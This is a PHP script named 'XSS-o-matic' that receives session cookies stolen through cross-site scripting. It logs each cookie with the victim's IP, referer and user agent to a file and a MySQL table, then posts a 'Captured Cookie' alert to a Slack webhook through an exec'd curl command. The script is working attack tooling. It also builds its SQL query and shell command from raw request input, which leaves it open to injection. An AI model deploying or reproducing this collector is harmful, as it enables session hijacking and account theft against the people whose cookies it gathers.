<?php

// Set Slack Webhook URL
$slackurl = "https://hooks.slack.com/services/YOUR_TOKEN_HERE";
$slackchannel = "#CHANNEL";
$slackemoji = ":see_no_evil:";
$slackbotname = "XSS-o-matic";

// Receives Required Parameters and Sets Variables
if(isset($_REQUEST['project'])){$Project = $_REQUEST['project'];}else{$Project = "";}
if(isset($_SERVER['REMOTE_ADDR'])){$IP = $_SERVER['REMOTE_ADDR'];}else{$IP = "";}
if(isset($_SERVER['REMOTE_HOST'])){$Host = $_SERVER['REMOTE_HOST'];}else{$Host = "";}
if(isset($_SERVER['REMOTE_USER'])){$User = $_SERVER['REMOTE_USER'];}else{$User = "";}
if(isset($_REQUEST['cookie'])){$Cookie = $_REQUEST['cookie'];}else{$Cookie = "";}
if(isset($_SERVER['HTTP_REFERER'])){$REFERER = $_SERVER['HTTP_REFERER'];}else{$Referer = "";}
if(isset($_SERVER['HTTP_HOST'])){$HTTPHost = $_SERVER['HTTP_HOST'];}else{$HTTPHost = "";}
if(isset($_SERVER['HTTP_USER_AGENT'])){$UserAgent = $_SERVER['HTTP_USER_AGENT'];}else{$UserAgent = "";}

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}

// Makes Password Safe for DB
//$user = stripslashes($user);


// Create connection
$conn = mysqli_connect('localhost', 'root', '', 'xss');
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}


// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/var/www/html/XSS-o-matic.log", "a") or die("Unable to open file!");
$txt = $cookie."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);


// Inserts Captured Information Into MySQL DB
$sql = "INSERT INTO sessions(Timestamp,Project,Cookie,User,Referer,IP, Host, UserAgent, HTTPHost) VALUES(NOW(),'$Project','$Cookie','$User','$Referer','$IP','$Host','$UserAgent', '$HTTPHost');";
$result = $conn->query($sql);

printf($conn->error);
$conn->close();

// If the Project is Blank, Set the Project Name to the IP Address for the Slack Message
if($Project == ""){$Project = $IP;}


// Set the Slack Message
$message = "Captured Cookie `".$Cookie."` From `".$Referer." (".$Project.")` via XSS!";

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

exec($cmd);



?>